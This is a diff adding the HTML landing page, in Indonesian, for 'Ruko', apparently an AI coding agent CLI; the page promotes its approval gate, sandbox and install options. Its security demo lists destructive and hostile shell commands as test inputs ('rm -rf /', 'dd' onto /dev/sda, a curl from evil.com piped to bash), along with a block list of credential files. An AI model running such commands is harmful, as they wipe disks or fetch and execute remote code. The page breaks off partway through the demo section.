@@ -1,0 +1,874 @@
+<!DOCTYPE html>
+<html lang="id" class="scroll-smooth" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ruko — AI Coding Agent CLI | Zero Dependencies, Security-Hardened</title>
+  
+  <!-- SEO & Social Meta -->
+  <meta name="description" content="Ruko adalah AI Coding Agent CLI murni berbasis Node.js/TypeScript tanpa runtime dependencies. Dilengkapi Dual-Layer Approval Gate, Workspace Sandbox, Snapshot Undo, dan 24 built-in tools." />
+  <meta name="keywords" content="Ruko, AI Coding Agent, CLI, Developer Tool, TypeScript, Node.js, Zero Dependency, Terminal UI, Guardian LLM, Pair Programming, Owens UI" />
+  <meta property="og:title" content="Ruko — AI Coding Agent CLI" />
+  <meta property="og:description" content="AI Coding Agent CLI murni dengan zero runtime dependencies, Dual-Layer Approval Gate, dan TUI responsif." />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://github.com/Iky969/Ruko-agent" />
+  <meta name="twitter:card" content="summary_large_image" />
+  
+  <!-- Favicon -->
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%230c331a'/><text x='50%' y='65%' font-size='55' font-family='monospace' font-weight='bold' fill='%2310b981' text-anchor='middle'>&gt;_</text></svg>" />
+
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Custom Stylesheet with Owens Liquid Glass Tokens -->
+  <link rel="stylesheet" href="css/custom.css" />
+  <!-- Ruki Mascot Stylesheet -->
+  <link rel="stylesheet" href="css/ruki-mascot.css" />
+</head>
+<body class="relative min-h-screen">
+
+  <!-- ============================================================
+       Liquid Background (Inspired by Iky969/Owens)
+       ============================================================ -->
+  <div class="fixed inset-0 -z-10 overflow-hidden pointer-events-none transition-colors duration-1000" style="background: rgb(var(--bg-ambient));">
+    
+    <!-- Base Mesh Gradient -->
+    <div class="absolute inset-0 transition-opacity duration-1000" style="opacity: var(--mesh-opacity); background: radial-gradient(at 15% 20%, var(--palette-primary) 0px, transparent 60%), radial-gradient(at 85% 25%, var(--palette-secondary) 0px, transparent 55%), radial-gradient(at 50% 80%, var(--palette-tertiary) 0px, transparent 65%), radial-gradient(at 10% 90%, var(--palette-primary) 0px, transparent 50%);"></div>
+
+    <!-- Liquid Blob 1 (Parallax organic shape) -->
+    <div class="absolute -top-24 -left-20 w-[520px] h-[520px]">
+      <div class="w-full h-full rounded-[45%_55%_65%_35%/50%_60%_40%_50%] mix-blend-screen filter blur-[100px] animate-blob-1 transition-colors duration-1000" style="background-color: var(--palette-primary); opacity: var(--blob-opacity-1);"></div>
+    </div>
+
+    <!-- Liquid Blob 2 (Parallax organic shape) -->
+    <div class="absolute top-1/3 -right-24 w-[600px] h-[600px]">
+      <div class="w-full h-full rounded-[55%_45%_40%_60%/45%_50%_55%_50%] mix-blend-screen filter blur-[120px] animate-blob-2 transition-colors duration-1000" style="background-color: var(--palette-secondary); opacity: var(--blob-opacity-2);"></div>
+    </div>
+
+    <!-- Liquid Blob 3 (Parallax organic shape) -->
+    <div class="absolute -bottom-32 left-1/4 w-[650px] h-[550px]">
+      <div class="w-full h-full rounded-[60%_40%_50%_50%/50%_40%_60%_50%] mix-blend-screen filter blur-[110px] animate-blob-3 transition-colors duration-1000" style="background-color: var(--palette-tertiary); opacity: var(--blob-opacity-3);"></div>
+    </div>
+
+    <!-- Floating Glass Particles -->
+    <div id="particles-container" class="absolute inset-0 pointer-events-none"></div>
+
+    <!-- Frosted Glass Depth Vignette -->
+    <div class="absolute inset-0 mesh-vignette pointer-events-none"></div>
+    <div class="absolute inset-0 backdrop-blur-[1px] pointer-events-none"></div>
+  </div>
+
+  <!-- Interactive Cursor Glow (Owens style) -->
+  <div id="cursor-glow" class="cursor-glow-blob hidden-on-touch" style="opacity: 0;"></div>
+
+  <!-- Film Grain Overlay (Owens style) -->
+  <div class="grain-overlay"></div>
+
+  <!-- ============================================================
+       Main Page Content
+       ============================================================ -->
+  <div class="relative z-10 flex flex-col min-h-screen">
+
+    <!-- Island Floating Header (Owens Style) -->
+    <header class="w-full sticky top-0 z-30 px-4 sm:px-8 pt-4">
+      <div class="max-w-7xl mx-auto rounded-3xl glass-panel px-4 sm:px-6 py-3 flex items-center justify-between gap-2 sm:gap-4 transition-all">
+        
+        <!-- Brand -->
+        <a href="#" class="flex items-center gap-3 group cursor-pointer min-w-0">
+          <div class="relative flex items-center justify-center w-11 h-11 rounded-2xl glass-button">
+            <div class="absolute inset-0 rounded-2xl bg-white/10 blur-sm group-hover:bg-white/20 transition-all"></div>
+            <span class="text-base font-bold font-mono text-emerald-400 group-hover:scale-110 transition-transform">&gt;_</span>
+          </div>
+          <div>
+            <div class="flex items-center gap-2">
+              <span class="text-lg sm:text-2xl font-bold tracking-tight brand-gradient font-mono">
+                RUKO
+              </span>
+              <span class="hidden xs:inline-block text-[10px] uppercase font-semibold tracking-widest px-2 py-0.5 rounded-full glass-pill text-white/70">
+                v1.8.0
+              </span>
+            </div>
+            <p class="text-xs text-muted tracking-wide max-w-[150px] truncate font-mono">AI Coding Agent</p>
+          </div>
+        </a>
+
+        <!-- Desktop Navigation -->
+        <nav class="hidden md:flex items-center gap-1 font-medium text-sm">
+          <a href="#fitur" class="px-3.5 py-2 rounded-xl text-white/70 hover:text-white hover:bg-white/10 transition-all">Fitur</a>
+          <a href="#keamanan" class="px-3.5 py-2 rounded-xl text-white/70 hover:text-white hover:bg-white/10 transition-all">Keamanan (Guardian)</a>
+          <a href="#terminal-demo" class="px-3.5 py-2 rounded-xl text-white/70 hover:text-white hover:bg-white/10 transition-all">Terminal Demo</a>
+          <a href="#tools" class="px-3.5 py-2 rounded-xl text-white/70 hover:text-white hover:bg-white/10 transition-all">24 Tools</a>
+          <a href="#commands" class="px-3.5 py-2 rounded-xl text-white/70 hover:text-white hover:bg-white/10 transition-all">Slash Commands</a>
+          <a href="#instalasi" class="px-3.5 py-2 rounded-xl text-white/70 hover:text-white hover:bg-white/10 transition-all">Instalasi</a>
+          <a href="#faq" class="px-3.5 py-2 rounded-xl text-white/70 hover:text-white hover:bg-white/10 transition-all">FAQ</a>
+        </nav>
+
+        <!-- Right Controls: Status Pill + Theme Toggle + GitHub -->
+        <div class="flex items-center gap-2">
+          
+          <!-- Availability / Tests Pill -->
+          <div class="hidden lg:flex items-center gap-2 text-xs text-white/80 glass-pill px-3 py-1.5 font-mono">
+            <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+            <span>901+ Tests Passed</span>
+          </div>
+
+          <!-- Theme Switcher Button (Owens Sun/Moon toggle) -->
+          <button
+            type="button"
+            class="theme-toggle-btn min-w-[42px] min-h-[42px] flex items-center justify-center p-2 rounded-xl glass-button text-white/80 hover:text-white transition"
+            aria-label="Toggle theme"
+            title="Beralih tema"
+          >
+            <svg class="w-4 h-4 text-amber-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+          </button>
+
+          <!-- GitHub Repo Link -->
+          <a 
+            href="https://github.com/Iky969/Ruko-agent" 
+            target="_blank" 
+            rel="noopener noreferrer"
+            class="flex items-center space-x-2 px-3 py-2 rounded-xl glass-button text-xs font-mono text-white/90 hover:text-white transition"
+            title="GitHub Repository"
+          >
+            <svg class="w-4 h-4 fill-current" viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+            <span class="hidden sm:inline">GitHub</span>
+          </a>
+
+          <!-- Mobile Hamburger -->
+          <button id="mobile-menu-btn" class="md:hidden min-w-[42px] min-h-[42px] flex items-center justify-center p-2 rounded-xl glass-button text-white/80" aria-label="Toggle menu">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path></svg>
+          </button>
+        </div>
+      </div>
+
+      <!-- Mobile Dropdown Menu -->
+      <div id="mobile-menu" class="hidden md:hidden max-w-7xl mx-auto mt-2 rounded-2xl glass-panel p-3 flex flex-col font-mono text-sm space-y-1">
+        <a href="#fitur" class="px-4 py-2.5 rounded-xl text-white/80 hover:text-white hover:bg-white/10 mobile-nav-link">Fitur Utama</a>
+        <a href="#keamanan" class="px-4 py-2.5 rounded-xl text-white/80 hover:text-white hover:bg-white/10 mobile-nav-link">Keamanan (Guardian)</a>
+        <a href="#terminal-demo" class="px-4 py-2.5 rounded-xl text-white/80 hover:text-white hover:bg-white/10 mobile-nav-link">Terminal Demo</a>
+        <a href="#tools" class="px-4 py-2.5 rounded-xl text-white/80 hover:text-white hover:bg-white/10 mobile-nav-link">24 Tools</a>
+        <a href="#commands" class="px-4 py-2.5 rounded-xl text-white/80 hover:text-white hover:bg-white/10 mobile-nav-link">Slash Commands</a>
+        <a href="#instalasi" class="px-4 py-2.5 rounded-xl text-white/80 hover:text-white hover:bg-white/10 mobile-nav-link">Instalasi</a>
+        <a href="#faq" class="px-4 py-2.5 rounded-xl text-white/80 hover:text-white hover:bg-white/10 mobile-nav-link">FAQ</a>
+      </div>
+    </header>
+
+    <!-- ============================================================
+         Hero Section
+         ============================================================ -->
+    <section class="pt-16 sm:pt-24 pb-16 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full">
+      <div class="text-center max-w-3xl mx-auto space-y-6">
+        
+        <!-- Aurora Pill Tagline (Owens Style) -->
+        <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full glass-pill aurora-border text-xs font-mono text-white/90">
+          <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+          <span>Ruko v1.8.0 Telah Rilis: Dual-Layer Guardian + Termux 40-col TUI</span>
+        </div>
+
+        <!-- Headline with Animated Text Shine -->
+        <h1 class="text-4xl sm:text-5xl lg:text-6xl font-extrabold tracking-tight leading-[1.12]">
+          <span class="text-white">AI Coding Agent CLI Murni.</span><br />
+          <span class="text-shine">Nol Dependensi. Keamanan Berlapis.</span>
+        </h1>
+
+        <!-- Subheadline -->
+        <p class="text-base sm:text-lg text-muted leading-relaxed font-normal max-w-2xl mx-auto">
+          Pair-programming cerdas langsung dari terminal Anda. Dibangun murni di atas <b>Node.js (ESM) + TypeScript tanpa runtime dependencies</b>. Dilengkapi <b>Dual-Layer Approval Gate</b>, Workspace Sandbox, Snapshot Undo, dan 24 built-in tools.
+        </p>
+      </div>
+
+      <!-- Hero Interactive Section: Ruki Mascot + Quick Install Box -->
+      <div class="pt-8 max-w-4xl mx-auto flex flex-col md:flex-row items-center justify-center gap-8 lg:gap-12">
+          
+          <!-- Ruki Mascot Slot (Interactive Cyber Assistant) -->
+          <div class="flex flex-col items-center">
+            <div id="ruki-mascot-slot" class="flex-shrink-0 relative"></div>
+            <div class="mt-2 text-[11px] font-mono text-muted flex items-center gap-1.5 opacity-80 hover:opacity-100 transition-opacity">
+              <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
+              <span>Ruki: "Klik saya untuk bicara!"</span>
+            </div>
+          </div>
+
+          <!-- Quick Install Tabs & Command Box (Glass Styled) -->
+          <div class="w-full max-w-xl">
+            <div class="glass-panel p-2 rounded-2xl shadow-2xl">
+            
+            <!-- Install Option Tabs -->
+            <div class="flex items-center justify-between text-xs font-mono border-b border-white/10 px-2 pb-2 mb-2">
+              <div class="flex space-x-1">
+                <button class="install-tab-btn px-3 py-1 rounded-xl text-emerald-400 bg-glass-highlight font-medium transition" data-tab="tab-curl">curl (Instan)</button>
+                <button class="install-tab-btn px-3 py-1 rounded-xl text-white/60 hover:text-white transition" data-tab="tab-npm">npm global</button>
+                <button class="install-tab-btn px-3 py-1 rounded-xl text-white/60 hover:text-white transition" data-tab="tab-git">git clone</button>
+                <button class="install-tab-btn px-3 py-1 rounded-xl text-white/60 hover:text-white transition" data-tab="tab-termux">Android Termux</button>
+              </div>
+              <span class="text-[10px] text-muted-soft hidden sm:inline">Node.js >= 18</span>
+            </div>
+
+            <!-- Tab Panels -->
+            <div class="px-2 py-1">
+              
+              <!-- Tab 1: Curl -->
+              <div id="tab-curl" class="install-tab-panel flex items-center justify-between font-mono text-xs sm:text-sm text-emerald-300 bg-black/40 px-3 py-2.5 rounded-xl border border-white/10">
+                <div class="truncate mr-2">
+                  <span class="text-white/40 select-none">$ </span>
+                  <span id="cmd-curl">curl -fsSL https://raw.githubusercontent.com/Iky969/Ruko-agent/main/install.sh | bash</span>
+                </div>
+                <button class="copy-trigger p-1.5 rounded-lg glass-button text-white/70 hover:text-white transition flex-shrink-0" data-target="#cmd-curl" title="Salin Perintah">
+                  <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                </button>
+              </div>
+
+              <!-- Tab 2: NPM -->
+              <div id="tab-npm" class="install-tab-panel hidden flex items-center justify-between font-mono text-xs sm:text-sm text-emerald-300 bg-black/40 px-3 py-2.5 rounded-xl border border-white/10">
+                <div class="truncate mr-2">
+                  <span class="text-white/40 select-none">$ </span>
+                  <span id="cmd-npm">npm install -g ruko</span>
+                </div>
+                <button class="copy-trigger p-1.5 rounded-lg glass-button text-white/70 hover:text-white transition flex-shrink-0" data-target="#cmd-npm" title="Salin Perintah">
+                  <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                </button>
+              </div>
+
+              <!-- Tab 3: Git Clone -->
+              <div id="tab-git" class="install-tab-panel hidden flex items-center justify-between font-mono text-xs sm:text-sm text-emerald-300 bg-black/40 px-3 py-2.5 rounded-xl border border-white/10">
+                <div class="truncate mr-2">
+                  <span class="text-white/40 select-none">$ </span>
+                  <span id="cmd-git">git clone https://github.com/Iky969/Ruko-agent.git && cd Ruko-agent && npm run build && npm link</span>
+                </div>
+                <button class="copy-trigger p-1.5 rounded-lg glass-button text-white/70 hover:text-white transition flex-shrink-0" data-target="#cmd-git" title="Salin Perintah">
+                  <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                </button>
+              </div>
+
+              <!-- Tab 4: Termux -->
+              <div id="tab-termux" class="install-tab-panel hidden flex items-center justify-between font-mono text-xs sm:text-sm text-emerald-300 bg-black/40 px-3 py-2.5 rounded-xl border border-white/10">
+                <div class="truncate mr-2">
+                  <span class="text-white/40 select-none">$ </span>
+                  <span id="cmd-termux">pkg install nodejs git -y && curl -fsSL https://raw.githubusercontent.com/Iky969/Ruko-agent/main/install.sh | bash</span>
+                </div>
+                <button class="copy-trigger p-1.5 rounded-lg glass-button text-white/70 hover:text-white transition flex-shrink-0" data-target="#cmd-termux" title="Salin Perintah">
+                  <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                </button>
+              </div>
+
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Hero Visual: Interactive Terminal Simulator -->
+      <div id="terminal-demo" class="mt-12 max-w-4xl mx-auto">
+        <div class="terminal-window spotlight-card">
+          
+          <!-- Terminal Titlebar -->
+          <div class="terminal-header flex items-center justify-between">
+            <div class="flex items-center space-x-2">
+              <span class="w-3 h-3 rounded-full bg-red-500/80 inline-block"></span>
+              <span class="w-3 h-3 rounded-full bg-yellow-500/80 inline-block"></span>
+              <span class="w-3 h-3 rounded-full bg-green-500/80 inline-block"></span>
+              <span class="text-xs font-mono text-muted pl-2">ruko-cli — terminal v1.8.0 (Node.js ESM)</span>
+            </div>
+            <div class="text-[11px] font-mono text-muted flex items-center space-x-2">
+              <span class="text-emerald-400">● 80x24 ANSI</span>
+            </div>
+          </div>
+
+          <!-- Interactive Simulator Body Container -->
+          <div id="terminal-simulator-container" class="relative"></div>
+
+        </div>
+
+        <!-- Terminal Quick Action Chips -->
+        <div class="mt-4 flex flex-wrap items-center justify-center gap-2 text-xs font-mono">
+          <span class="text-muted-soft">Coba Langsung:</span>
+          <button class="term-quick-cmd px-3 py-1 rounded-xl glass-pill text-white/80 hover:text-emerald-300 transition" data-cmd="/help">/? Bantuan</button>
+          <button class="term-quick-cmd px-3 py-1 rounded-xl glass-pill text-white/80 hover:text-emerald-300 transition" data-cmd="npm test">npm test (901 Test)</button>
+          <button class="term-quick-cmd px-3 py-1 rounded-xl glass-pill text-red-300 hover:text-red-200 border-red-500/30 transition" data-cmd="exec rm -rf /">Uji rm -rf / (BLOCKED)</button>
+          <button class="term-quick-cmd px-3 py-1 rounded-xl glass-pill text-emerald-300 hover:text-emerald-200 border-emerald-500/30 transition" data-cmd="exec python3 -c 'print(1+1)'">Uji Guardian LLM</button>
+          <button class="term-quick-cmd px-3 py-1 rounded-xl glass-pill text-cyan-300 hover:text-cyan-200 transition" data-cmd="/plan on">/plan on</button>
+          <button class="term-quick-cmd px-3 py-1 rounded-xl glass-pill text-yellow-300 hover:text-yellow-200 transition" data-cmd="/ctx">/ctx Budget</button>
+          <button class="term-quick-cmd px-3 py-1 rounded-xl glass-pill text-indigo-300 hover:text-indigo-200 transition" data-cmd="/undo">/undo Rollback</button>
+        </div>
+
+      </div>
+
+      <!-- Key Metrics Strip (Glass Style) -->
+      <div class="mt-16 grid grid-cols-2 md:grid-cols-5 gap-4 text-center max-w-5xl mx-auto py-6 border-y border-white/10">
+        <div>
+          <div class="text-2xl sm:text-3xl font-extrabold text-emerald-400 font-mono">0</div>
+          <div class="text-xs text-muted font-mono mt-0.5">Runtime Deps</div>
+        </div>
+        <div>
+          <div class="text-2xl sm:text-3xl font-extrabold text-white font-mono">901+</div>
+          <div class="text-xs text-muted font-mono mt-0.5">Unit Tests Passed</div>
+        </div>
+        <div>
+          <div class="text-2xl sm:text-3xl font-extrabold text-cyan-400 font-mono">24</div>
+          <div class="text-xs text-muted font-mono mt-0.5">Built-in Tools</div>
+        </div>
+        <div>
+          <div class="text-2xl sm:text-3xl font-extrabold text-white font-mono">&lt; 15ms</div>
+          <div class="text-xs text-muted font-mono mt-0.5">Startup Latency</div>
+        </div>
+        <div class="col-span-2 md:col-span-1">
+          <div class="text-2xl sm:text-3xl font-extrabold text-emerald-400 font-mono">100%</div>
+          <div class="text-xs text-muted font-mono mt-0.5">Open Source (MIT)</div>
+        </div>
+      </div>
+
+    </section>
+
+    <!-- ============================================================
+         Tech Stack Marquee (Inspired by Owens TechMarquee)
+         ============================================================ -->
+    <section class="w-full max-w-7xl mx-auto px-4 sm:px-8 py-6 overflow-hidden" aria-hidden>
+      <div class="relative">
+        <div id="tech-marquee-track" class="marquee-track flex items-center gap-4 w-max"></div>
+
+        <!-- Edge Fades (Theme-aware) -->
+        <div class="absolute inset-y-0 left-0 w-20 bg-gradient-to-r from-[rgb(var(--bg-ambient))] to-transparent pointer-events-none"></div>
+        <div class="absolute inset-y-0 right-0 w-20 bg-gradient-to-l from-[rgb(var(--bg-ambient))] to-transparent pointer-events-none"></div>
+      </div>
+    </section>
+
+    <!-- ============================================================
+         Bento Grid Section (Owens Liquid Glass Cards)
+         ============================================================ -->
+    <section id="fitur" class="py-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full">
+      <div class="text-center max-w-2xl mx-auto mb-14 space-y-3">
+        <span class="text-xs font-mono uppercase tracking-widest text-emerald-400 font-bold glass-pill px-3 py-1">Pondasi Rekayasa</span>
+        <h2 class="text-3xl sm:text-4xl font-extrabold text-white">Kenapa Ruko Berbeda dari Agent Lain?</h2>
+        <p class="text-sm text-muted">Dirancang khusus untuk keamanan terminal mutlak, portabilitas tinggi, dan kecepatan tanpa kompromi.</p>
+      </div>
+
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+        
+        <!-- Card 1: Dual-Layer Approval Gate -->
+        <div class="md:col-span-2 glass-card spotlight-card p-8 rounded-3xl flex flex-col justify-between relative overflow-hidden group">
+          <div class="absolute -right-12 -top-12 w-48 h-48 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none"></div>
+          <div>
+            <div class="w-12 h-12 rounded-2xl glass-button flex items-center justify-center text-2xl mb-5">
+              🛡️
+            </div>
+            <h3 class="text-xl font-bold text-white mb-2">Dual-Layer Approval Gate & Guardian LLM</h3>
+            <p class="text-muted text-sm leading-relaxed mb-6">
+              Mekanisme gerbang keamanan 2 lapis: <b>Layer 1 Regex Gate</b> menangkap seketika pola berisiko fatal (<code>rm -rf /</code>, <code>mkfs</code>, <code>dd</code>, fork-bomb) tanpa latensi. Perintah bernuansa seperti flag inline dievaluasi secara semantik oleh <b>Layer 2 Guardian LLM</b> terisolasi (temperature 0).
+            </p>
+          </div>
+          <div class="bg-black/30 p-4 rounded-2xl border border-white/10 font-mono text-xs space-y-2">
+            <div class="text-muted flex items-center justify-between">
+              <span>Arsitektur Evaluasi Perintah Shell</span>
+              <span class="text-emerald-400">Audit Log .ruko/guardian-audit.log (0600)</span>
+            </div>
+            <div class="flex flex-col sm:flex-row items-center gap-2 pt-1 text-[11px]">
+              <span class="w-full sm:w-auto px-3 py-1.5 rounded-xl glass-pill text-white/80 text-center">Shell Command</span>
+              <span class="text-muted-soft">→</span>
+              <span class="w-full sm:w-auto px-3 py-1.5 rounded-xl glass-pill text-amber-300 border-amber-500/30 text-center">Layer 1: Regex Risk</span>
+              <span class="text-muted-soft">→</span>
+              <span class="w-full sm:w-auto px-3 py-1.5 rounded-xl glass-pill text-cyan-300 border-cyan-500/30 text-center">Layer 2: Guardian LLM</span>
+              <span class="text-muted-soft">→</span>
+              <span class="w-full sm:w-auto px-3 py-1.5 rounded-xl glass-pill text-emerald-300 border-emerald-500/30 text-center">Aman / Konfirmasi User</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Card 2: Zero Runtime Dependencies -->
+        <div class="glass-card spotlight-card p-8 rounded-3xl flex flex-col justify-between group">
+          <div>
+            <div class="w-12 h-12 rounded-2xl glass-button flex items-center justify-center font-mono font-bold text-cyan-400 text-lg mb-5">
+              &gt;_
+            </div>
+            <h3 class="text-xl font-bold text-white mb-2">Zero Runtime Dependencies</h3>
+            <p class="text-muted text-sm leading-relaxed mb-4">
+              Murni dibangun dengan pustaka standar bawaan Node.js: <code>node:fs</code>, <code>node:child_process</code>, <code>node:readline</code>.
+            </p>
+            <ul class="text-xs text-muted space-y-2 mb-6 font-mono">
+              <li class="flex items-center space-x-2">
+                <span class="text-emerald-400">✓</span>
+                <span>0 MB node_modules saat runtime</span>
+              </li>
+              <li class="flex items-center space-x-2">
+                <span class="text-emerald-400">✓</span>
+                <span>Bebas dari supply-chain attack</span>
+              </li>
+              <li class="flex items-center space-x-2">
+                <span class="text-emerald-400">✓</span>
+                <span>Startup instan tanpa parse overhead</span>
+              </li>
+            </ul>
+          </div>
+          <div class="p-3 glass-panel rounded-2xl font-mono text-[11px] text-cyan-300">
+            Immutable Security Core: Mengunci integritas modul saat startup.
+          </div>
+        </div>
+
+        <!-- Card 3: Workspace Sandbox & Credential Shield -->
+        <div class="glass-card spotlight-card p-8 rounded-3xl flex flex-col justify-between group">
+          <div>
+            <div class="w-12 h-12 rounded-2xl glass-button flex items-center justify-center text-2xl mb-5">
+              🔒
+            </div>
+            <h3 class="text-xl font-bold text-white mb-2">Workspace Sandbox & Proteksi Kredensial</h3>
+            <p class="text-muted text-sm leading-relaxed mb-4">
+              Menegakkan batasan ketat dengan <code>assertInsideWorkspace()</code>. Memblokir symlink traversal ke <code>../../etc/passwd</code> atau <code>~/.ssh</code>.
+            </p>
+          </div>
+          <div class="bg-black/30 p-3.5 rounded-2xl border border-white/10 font-mono text-[11px] text-white/90 space-y-1">
+            <div class="text-red-400 font-semibold">Blokir Akses Sensitif:</div>
+            <div class="text-muted-soft">• .ruko/config.json & .env</div>
+            <div class="text-muted-soft">• id_rsa, *.pem, *.key</div>
+            <div class="text-muted-soft">• Blokir printenv & dump env</div>
+          </div>
+        </div>
+
+        <!-- Card 4: Snapshot Undo Journal -->
+        <div class="glass-card spotlight-card p-8 rounded-3xl flex flex-col justify-between group">
+          <div>
+            <div class="w-12 h-12 rounded-2xl glass-button flex items-center justify-center text-2xl mb-5">
+              ⏪
+            </div>
+            <h3 class="text-xl font-bold text-white mb-2">Snapshot Undo Otomatis</h3>
+            <p class="text-muted text-sm leading-relaxed mb-4">
+              Setiap kali AI mengubah atau menghapus file, snapshot instan dicadangkan ke <code>.ruko/undo/</code> dengan mode 0600.
+            </p>
+          </div>
+          <div class="bg-black/30 p-3.5 rounded-2xl border border-white/10 font-mono text-[11px] text-indigo-300">
+            Ketik <code>/undo [path]</code> untuk memulihkan file spesifik atau seluruh perubahan sesi dalam sekejap.
+          </div>
+        </div>
+
+        <!-- Card 5: Mobile & Termux Android TUI -->
+        <div class="glass-card spotlight-card p-8 rounded-3xl flex flex-col justify-between group">
+          <div>
+            <div class="w-12 h-12 rounded-2xl glass-button flex items-center justify-center text-2xl mb-5">
+              📱
+            </div>
+            <h3 class="text-xl font-bold text-white mb-2">Responsif Termux (40 Cols)</h3>
+            <p class="text-muted text-sm leading-relaxed mb-4">
+              TUI Ruko dirancang adaptif. Status bar memotong teks secara proporsional agar tidak wrap-stacking bahkan di layar sempit Android Termux.
+            </p>
+          </div>
+          <div class="bg-black/30 p-3.5 rounded-2xl border border-white/10 font-mono text-[11px] text-amber-300">
+            Dilengkapi ambient bottom tray, tree log <code>├── </code>, dan ticker reasoning in-place.
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ============================================================
+         Interactive Security Analyzer Playground
+         ============================================================ -->
+    <section id="keamanan" class="py-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full">
+      <div class="glass-panel p-8 sm:p-12 rounded-3xl border border-white/15 relative overflow-hidden">
+        <div class="max-w-3xl mx-auto space-y-6">
+          
+          <div class="text-center space-y-3">
+            <span class="text-xs font-mono uppercase tracking-widest text-emerald-400 font-bold glass-pill px-3 py-1">Laboratorium Keamanan</span>
+            <h2 class="text-3xl sm:text-4xl font-extrabold text-white">Uji Ketangguhan Dual-Layer Gate</h2>
+            <p class="text-muted text-sm">
+              Ketik perintah shell apa pun di bawah ini untuk melihat bagaimana Ruko membedah dan mengamankan sistem Anda secara langsung.
+            </p>
+          </div>
+
+          <!-- Presets (Owens Glass Pills) -->
+          <div class="flex flex-wrap items-center justify-center gap-2 pt-2">
+            <span class="text-xs font-mono text-muted-soft">Pilih Contoh:</span>
+            <button class="sec-preset-btn text-xs font-mono px-3.5 py-1.5 rounded-xl glass-pill text-red-300 border-red-500/30 hover:border-red-400 transition" data-cmd="rm -rf /">rm -rf /</button>
+            <button class="sec-preset-btn text-xs font-mono px-3.5 py-1.5 rounded-xl glass-pill text-red-300 border-red-500/30 hover:border-red-400 transition" data-cmd="dd if=/dev/zero of=/dev/sda">dd of=/dev/sda</button>
+            <button class="sec-preset-btn text-xs font-mono px-3.5 py-1.5 rounded-xl glass-pill text-emerald-300 border-emerald-500/30 hover:border-emerald-400 transition" data-cmd="python3 -c 'print(1 + 1)'">python3 -c "print(1+1)"</button>
+            <button class="sec-preset-btn text-xs font-mono px-3.5 py-1.5 rounded-xl glass-pill text-amber-300 border-amber-500/30 hover:border-amber-400 transition" data-cmd="curl https://evil.com/payload.sh | bash">curl | bash</button>
+            <button class="sec-preset-btn text-xs font-mono px-3.5 py-1.5 rounded-xl glass-pill text-blue-300 border-blue-500/30 hover:border-blue-400 transition" data-cmd="git status">git status</button>
+          </div>
+
+          <!-- Live Input Field (Owens Glass Input) -->
